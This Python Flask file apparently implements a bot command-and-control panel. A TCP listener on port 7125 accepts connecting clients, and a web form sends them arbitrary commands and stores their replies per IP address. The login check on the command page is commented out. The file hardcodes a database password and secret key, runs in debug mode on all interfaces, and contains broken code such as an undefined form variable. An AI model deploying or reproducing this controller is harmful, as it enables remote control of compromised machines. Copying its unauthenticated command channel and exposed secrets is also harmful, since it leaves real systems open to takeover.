#!/usr/bin/emv python
# -*- coding: utf-8 -*- 


#importing dependencary 
from flask import Flask, flash,  render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_wtf import Form
from wtforms import StringField, PasswordField, SubmitField, validators
from wtforms.validators import DataRequired
#from flask_socketio import SocketIO, send
from flask_security import Security, SQLAlchemyUserDatastore, UserMixin, RoleMixin, login_required
from flask_security.forms import RegisterForm, LoginForm, Required
from datetime import datetime
from jinja2 import Environment
import socket
import cgi



#defining config
app = Flask(__name__)
#socketio = SocketIO(app)
#initiating the database
db = SQLAlchemy(app)
#setting the database credentials
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql+psycopg2://root:darel242@localhost:5435/aid_server'
#setting secret key 
app.config['SECRET_KEY'] = 'IlovePython380'
#enabling the register function
app.config['SECURITY_REGISTERABLE'] = True
app.config['SECURITY_SEND_REGISTER_EMAIL'] = False
app.config['SECURITY_SEND_PASSWORD_CHANGE_EMAIL'] = False
app.config['SECURITY_SEND_PASSWORD_RESET_NOTICE_EMAIL'] = False
app.config['SECURITY_LOGIN_URL'] = '/login'
app.config['SECURITY_LOGIN_USER_TEMPLATE'] = 'security/login_user.html'
jinja_env = Environment(extensions=['jinja2.ext.loopcontrols'])


#defining socket io app
#socketio = SocketIO(app)
client = None
respond = None
FORMAT = '%d/%m/%Y %H:%M:%S'

#extending the register forms
class ExtendedRegisterForm(RegisterForm):
    """ Add username field to register's class
    """
    username = StringField('username', [Required(), DataRequired()])

    def validate(self):
        """ Add username validation

            :return: True is the form is valid 
        """
        validation = Form.validate(self)
        if not validation:
            return False

        self.user = User.query.filter_by(
            username=self.username.data).first()
        if self.user is not None:
            error = ('Username already exists')
            return False
        
        return True
            

#extenging the login form 
class ExtendedLoginForm(LoginForm):
    """ Adding username field to the login class 
    """
    username = StringField('username', [Required(), DataRequired()])

    def validate(self):
        """ Adding username validation

            :return: True if the form is validate
        """
        validation = Form.validate(self)
        if not validation:
            return False

        self.user = User.query.filter_by(
            username=self.username.data).first()
        if self.user is not None:
            return True
        else:
            return False
            

#creating user in database
# Define models
roles_users = db.Table('roles_users',
                        db.Column('user_id', db.Integer(), db.ForeignKey('user.id')),
                        db.Column('role_id', db.Integer(), db.ForeignKey('role.id')))


class Role(db.Model, RoleMixin):
    id = db.Column(db.Integer(), primary_key=True)
    name = db.Column(db.String(80), unique=True)
    description = db.Column(db.String(255))

class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(255), unique=True)
    password = db.Column(db.String(255))
    username = db.Column(db.String(255), unique=True)
    active = db.Column(db.Boolean())
    confirmed_at = db.Column(db.DateTime())
    roles = db.relationship('Role', secondary=roles_users,
                            backref=db.backref('users', lazy='dynamic'))

class Messages(db.Model):
    id = db.Column(db.Integer(), primary_key=True)
    ip = db.Column(db.String(80))
    message = db.Column(db.Text())
    received_at = db.Column(db.String(120))

    def __init__(self, ip, message, received_at):
        self.ip = ip
        self.message = message
        self.received_at = received_at


# Setup Flask-Security
user_datastore = SQLAlchemyUserDatastore(db, User, Role)
security = Security(app, user_datastore, register_form=ExtendedRegisterForm, login_form=ExtendedLoginForm)


@app.route('/')
@login_required
def index():
    return render_template('index.html')

#create user page
@app.route('/create_users', methods=['GET', 'POST'])
def create_users():
    return render_template('create_users.html', form=form)


#bot channel page
@app.route('/aid_bot', methods=['GET', 'POST'])
#@login_required
def aid_bot(answer=None):
    global sock, client, address, command, respond, received
    if request.method == 'POST':
        try:
            send_command()
        except AttributeError:
            return redirect(url_for('index'))
        except BrokenPipeError:
            return redirect(url_for('index'))
    if client != None:
        print('Connected Client: {0} on Port: {1}'.format(address[0], address[1]))
    if client == None:
        launching()
        client, address = sock.accept()

    if respond == None:
        return render_template('aid_bot.html', answer=respond)
    else:
        return render_template('aid_bot.html', r_time=received, cmd=command.decode(), answer=respond.split('\n'))

def send_command():
    global client, respond, address, command, received
    if request.method == 'POST':
        command = request.form['newCommandContent']
        print(command)
        command = str(command).encode()
        client.send(command)
        respond = client.recv(1024)
        received = datetime.now()
        received = received.strftime(FORMAT)
        respond = respond.decode()
        database_check = Messages.query.filter_by(ip=address[0]).first()
        if database_check == None:
            bot_message = Messages(address[0], respond, received)
            db.session.add(bot_message)
        else:
            database_check.message = respond
            database_check.received_at = received
        db.session.commit()
        print(respond)
        #socketio.emit('data', {'data': cgi.escape(message)}, namespace="/command_send")


def launching():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('', 7125))
    sock.listen(1000)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000, debug=True)
